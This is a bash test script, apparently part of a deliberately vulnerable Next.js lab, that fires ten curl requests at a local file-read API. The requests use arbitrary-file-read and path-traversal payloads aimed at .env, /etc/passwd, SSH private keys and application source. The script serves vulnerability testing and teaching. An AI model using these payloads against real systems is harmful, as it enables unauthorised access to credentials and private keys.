#!/bin/bash

# React2Shell Vulnerability Test - File Read API
# Test script for arbitrary file reading
# WARNING: For testing purposes only on authorized systems!

BASE_URL="http://localhost:3000"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
cd "${SCRIPT_DIR}"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}React2Shell - File Read Exploit Tests${NC}"
echo -e "${BLUE}========================================${NC}\n"

# Test 1: Read package.json
echo -e "${YELLOW}[TEST 1] Read package.json${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-file-read" \
  -H "Content-Type: application/json" \
  -d '{"filePath": "./package.json"}' | jq '.'
echo ""

# Test 2: Read .env file (if exists)
echo -e "${YELLOW}[TEST 2] Read .env file${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-file-read" \
  -H "Content-Type: application/json" \
  -d '{"filePath": "./.env"}' | jq '.'
echo ""

# Test 3: Read next.config.js
echo -e "${YELLOW}[TEST 3] Read next.config.js${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-file-read" \
  -H "Content-Type: application/json" \
  -d '{"filePath": "./next.config.js"}' | jq '.'
echo ""

# Test 4: Path Traversal - Read /etc/passwd
echo -e "${YELLOW}[TEST 4] Path Traversal - /etc/passwd${NC}"
echo -e "${RED}⚠️  DANGEROUS: Attempting to read system password file${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-file-read" \
  -H "Content-Type: application/json" \
  -d '{"filePath": "/etc/passwd"}' | jq '.'
echo ""

# Test 5: Path Traversal - Read /etc/hosts
echo -e "${YELLOW}[TEST 5] Path Traversal - /etc/hosts${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-file-read" \
  -H "Content-Type: application/json" \
  -d '{"filePath": "/etc/hosts"}' | jq '.'
echo ""

# Test 6: Relative Path Traversal
echo -e "${YELLOW}[TEST 6] Relative Path Traversal${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-file-read" \
  -H "Content-Type: application/json" \
  -d '{"filePath": "../../../etc/passwd"}' | jq '.'
echo ""

# Test 7: Read SSH Private Key (if exists)
echo -e "${YELLOW}[TEST 7] Read SSH Private Key${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-file-read" \
  -H "Content-Type: application/json" \
  -d '{"filePath": "/home/'$(whoami)'/.ssh/id_rsa"}' | jq '.'
echo ""

# Test 8: Read Node Modules
echo -e "${YELLOW}[TEST 8] Read from node_modules${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-file-read" \
  -H "Content-Type: application/json" \
  -d '{"filePath": "./node_modules/next/package.json"}' | jq '.'
echo ""

# Test 9: Read API Route Source
echo -e "${YELLOW}[TEST 9] Read API Route Source Code${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-file-read" \
  -H "Content-Type: application/json" \
  -d '{"filePath": "./pages/api/vulnerable-file-read.js"}' | jq '.'
echo ""

# Test 10: Read Windows System File (if on Windows)
echo -e "${YELLOW}[TEST 10] Read Windows System File${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-file-read" \
  -H "Content-Type: application/json" \
  -d '{"filePath": "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts"}' | jq '.'
echo ""

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}File Read Exploit Tests Completed${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "\n${RED}⚠️  If any sensitive files were read, the API is VULNERABLE${NC}"
echo -e "${YELLOW}This demonstrates arbitrary file reading capability${NC}\n"
